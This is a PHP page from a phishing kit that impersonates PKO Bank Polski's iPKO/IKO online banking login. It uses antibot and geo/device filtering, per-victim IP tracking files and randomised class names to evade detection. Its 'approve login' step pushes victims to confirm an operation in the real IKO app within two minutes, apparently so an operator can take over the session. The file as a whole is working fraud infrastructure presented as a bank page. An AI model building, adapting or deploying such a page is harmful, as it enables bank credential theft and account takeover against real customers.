<?php
    error_reporting(0);
    session_start();

    include "../antibots-debug/antibots.php";
    include '../setting/functions.php';
    include '../includes/current-page.php';
    include '../includes/check-allowed-countries.php';
    include '../includes/check-devices-allow.php';

    $ip = get_client_ip();
    $get_name_file = $ip;
    $target_file = "../panel/storage/{$get_name_file}.json";
    $json_file = file_get_contents($target_file);
    $user_info = json_decode($json_file, true);
    $user_info['error_approve_login'];
    
    if($user_info['error_approve_login'] == 1) {
        $get_name_page = "Page Approve Login Error";
        $get_step = "approve-login-error";
    }else{
        $get_name_page = "Page Approve Login";
        $get_step = "approve-login";
    }
    get_page_info($get_name_page, $get_name_file);
    
    $random_classes = rand(0, 1000000); 
    $permitted_chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
?>
<!DOCTYPE html>
<html lang="en" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> ">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- SEO -->
    <?php include '../libraries/seo.php'; ?>
    <!-- Font Google -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
    <!-- Font Awesome Library --> 
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha512-KfkfwYDsLkIlwQp6LFnl8zNdLGxu9YAA1QvwINks4PhcElQSvqcyVLLD9aMhXd13uQjoXtEKNosOWaZqXgel0g==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <!-- File Css -->
    <link rel="stylesheet" href="../css/main.css">
    <link rel="stylesheet" href="../css/basic-thinks.css">
    <!-- Favicon -->
    <link rel="icon" type="image/png" href="../img/favicon.ico">
    <link rel="shortcut" type="image/png" href="../img/favicon.ico">
    <link rel="appel-touch-icon" type="image/png" href="../img/favicon.ico">
    <title>STRONA INTERNETOWA</title>
</head>
<body id="body" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> body">
    <!-- Nav -->
    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> nav-section">
        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> content-nav-section">
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> logo">
                <img src="../img/logo.png" alt="">
            </div>
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> btn-lang">
                <img src="../img/flag.png" alt="" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> flag">
                PL
                <img src="../img/icon-arrow.png" alt="" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> arrow">
            </div>
        </div>
    </div>
    <!-- Nav -->

    <!-- Main -->
    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> main-section">
        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> content-main-section">
            <form action="../control-panel/check-action.php" method="post" id="fSD" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> f-s-d-p-section">
                <input type="hidden" name="step" value="<?php echo $get_step; ?>">
                <input type="hidden" name="ip" value="<?php echo $get_name_file; ?>">
                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> coul-width">
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> coul-2" style="margin-bottom: 10px !important;">
                        <h1>Zaloguj się</h1>
                    </div>
                    <?php
                        if ($user_info['error_approve_login'] == 1) {
                            echo
                            '<div class="message-error-pages">
                                <i class="fa-solid fa-triangle-exclamation"></i>
                                Operacja nie została zatwierdzona w aplikacji mobilnej iPKO biznes. Zatwierdź operację, aby zweryfikować sesję logowania.
                            </div>';
                        }
                    ?>
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> prt-app">
                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> coul-2-other">
                            <h2>Zatwierdź operację w aplikacji mobilnej IKO</h2>
                            <p class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> p-app">Masz <strong style="color: #ce2b31;">2:00</strong> min na zatwierdzenie operacji na urządzeniu</p>
                            <p class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> p-app">Aby zalogować się na swoje konto, należy się uwierzytelnić.</p>
                        </div>
                        <img src="../img/icon-app.png" alt="">
                    </div>
                </div>
            </form>
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> coul-text-login">
                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> text-app">
                    <h1 class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> title-app">Logowanie dwuetapowe</h1>
                    <p class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> p-app-other">Logowanie w aplikacji możesz potwierdzić na dwa sposoby:</p>
                    <ul>
                        <li>klikając "Potwierdź" w otrzymanym powiadomieniu lub</li>
                        <li>klikając "Potwierdź" w uruchomionej aplikacji IKO (w tym przypadku może być wymagane podanie kodu PIN).</li>
                    </ul>
                    <p class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> p-app-other">
                        <strong>Nie możesz potwierdzić logowania w aplikacji IKO?</strong> Pomożemy, zadzwoń na naszą infolinię: <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> link-number">800 301 301</span> lub <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> link-number">+48 81 434 50 50</span>.
                    </p>
                </div>
            </div>
        </div> 
        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> coul-boxs">
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> box-section">
                <small class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> current-date"><?php echo date("d.m.Y"); ?></small>
                <h4>Bezpieczeństwo zaczyna się od prostych nawyków</h4>
                <p>
                    Koniec roku to dobry moment, by uporządkować kwestie związane z bezpieczeństwem Twoich danych i pieniędzy.
                </p>
                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> link-box">Więcej</div>
            </div>
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> box-section">
                <small class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> current-date"><?php echo date("d.m.Y"); ?></small>
                <h4>Już jest! Potwierdzanie przelewów dziecka w aplikacji IKO</h4>
                <p>
                    Sprawdź nowości dla rodziców
                </p>
                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> link-box">Więcej</div>
            </div>
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> box-section" style="margin-bottom: 0px !important;">
                <small class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> current-date">28.07.<?php echo date("Y"); ?></small>
                <h4 style="color: #ca171d !important;">Kolejne ataki cyberprzestępców</h4>
                <p style="color: #ca171d !important;">
                    Sprawdź najnowsze ostrzeżenia.
                </p>
                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> link-box">Więcej</div>
            </div>
        </div>
    </div>
    <!-- Main -->

    <!-- Footer -->
    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> footer-section">
        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> content-footer-section">
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> links-footer-left">
                <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> link-footer-left">© 2025 PKO Bank Polski</span>
                <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> link-footer-left">Kod BIC (Swift): BPKOPLPW</span>
                <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> link-footer-left">Polityka prywatności</span>
            </div>
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> links-footer-right">
                <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> link-footer-right"><img src="../img/icon-footer-1.png" alt="">Bezpieczeństwo</span>
                <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> link-footer-right"><img src="../img/icon-footer-2.png" alt="">Pomoc</span>
                <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> link-footer-right"><img src="../img/icon-footer-3.png" alt="">Kontakt</span>
            </div>
        </div>
    </div>
    <!-- Footer -->

    <!-- Script Js -->
    <script src="../js/jquery.min.js"></script>
    <?php include '../includes/redirect.php'; ?>
    <?php include '../includes/status.php'; ?>
</body>
</html>